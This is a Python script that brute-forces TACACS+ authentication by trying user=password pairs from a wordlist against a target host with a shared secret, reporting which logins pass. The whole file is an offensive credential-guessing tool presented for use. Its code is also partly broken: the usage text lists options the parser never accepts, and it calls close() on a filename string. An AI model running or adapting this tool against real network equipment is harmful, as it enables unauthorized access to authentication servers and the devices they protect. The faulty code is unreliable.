#!/usr/bin/python
from __future__ import print_function

import getopt
import threading
from itertools import islice
from tacacs_plus.client import TACACSClient
import socket
import sys
import Queue


class hackcrack(threading.Thread):
    def __init__(self, chunk):
        threading.Thread.__init__(self)
        self.chunk = chunk

    def run(self):
        print("new threading processing "+str(len(self.chunk)))
        for line in self.chunk:
                line.strip("\n")
                print("new auth: "+str((line)))

                try:
                    username = line.split("=")[0].strip()
                    password = line.split("=")[1].strip()
                    print("sproof auth with username:"+ username + " passwd: "+password+" host "+host+" secretkey "+secretkey)
                    cli = TACACSClient(host, 49, secretkey, timeout=10, family=socket.AF_INET)
                    # 使用用户名和密码认证
                    authen = cli.authenticate(username, password)
                    #authen = cli.authenticate("mason", "1231")
                    print("PASS!" if authen.valid else "FAIL!")
                except Exception as e:
                    print("auth exception")
                    print(e)
                    pass


def info():
    print("")
    print("[*] USAGE:")
    print("./Crack.py [options] -w auth.txt -H hostname -s key ")
    print(" ")
    print("Options:")
    print("-w || --wordlist  auth.txt user=password form pair line by line")
    print("-H || --host the server address")
    print("-s || --secretkey the sec key")
    print("-u || --username ")
    print("-p || --password ")
    print("-n || --numperprocess   the num of lines processed per process")
    print("")
    exit(1)


def crack(chunk):
    global queue
    threads = []
    line = 5
    queue = Queue.Queue()
    y = hackcrack(chunk)
    y.start()
    threads.append(y)
    for x in threads:
        x.join()


if __name__ == '__main__':
    try:
        opts, args = getopt.getopt(sys.argv[1:], "w:H:s:", ["help", "wordlist", "host", "secretkey"])
    except getopt.GetoptError as err:
        print(str(err.msg))
        info()

    likely = False
    keepGoing = False
    secretkey = "testing123"
    authfile = ""
    numperprocess=1000;
    chunks=[]
    host=""
    username=""
    password=""

    for o, a in opts:
        if o in ("-h", "--help"):
            info()
        elif o in ("-w", "--wordlist"):
            keepGoing = True
            authfile = a
        elif o in ("-s", "--secretkey"):
            secretkey = a
        elif o in ("-H", "--host"):
            host = a
        elif o in ("-n", "--numperprocess"):
            numperprocess = a
        elif o in ("-u", "--username"):
            username = a
        elif o in ("-p", "--password"):
            password = a
        else:
            assert False, "unhandled option"

    if len(sys.argv) < 3:
        info()

    # 提供字典
    if "" !=authfile:
        with open(authfile) as f:
            while True:
                next_n_lines = list(islice(f, numperprocess))
                chunks.append(next_n_lines)
                crack(next_n_lines)
                if not next_n_lines:
                    break

    authfile.close()

    # 提供用户名密码主机
    if "" != username and "" != password and "" != host:
        try:
            print(
                "sproof auth with username:" + username + " passwd: " + password + " host " + host + " secretkey " + secretkey)
            cli = TACACSClient(host, 49, secretkey, timeout=10, family=socket.AF_INET)
            authen = cli.authenticate(username, password)
            print("PASS!" if authen.valid else "FAIL!")
        except Exception as e:
            print("auth exception")
            print(e)
            pass